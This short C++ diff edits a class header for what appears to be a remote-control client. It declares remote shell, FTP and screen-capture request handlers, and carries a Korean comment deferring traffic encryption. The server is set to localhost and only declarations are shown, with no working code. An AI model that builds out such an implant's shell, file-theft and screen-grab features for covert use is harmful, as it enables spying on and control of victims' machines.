@@ -15,12 +15,7 @@ private:
 		server = L"127.0.0.1",
 		index = L"/tests";
 
-	HINTERNET
-		hSession = NULL,
-		hConnect = NULL,
-		hRequest = NULL;
 
-	BOOL bResults = FALSE;
 	std::list<std::string> shellCmd;
 	
 
@@ -35,6 +30,7 @@ public:
 	void printParsedResponse(DDprotocol* resData, std::string data);
 	void handleShellRequest();
 	void handleFtpRequest(std::string path);
+	void handleScreenRequest();
 	/* 암호화는 디버깅 편의를 위해서 마지막에 구현하는걸로 */
 	LPVOID dataEncrypt(LPVOID data);
 	LPVOID dataDecrypt(LPVOID data);
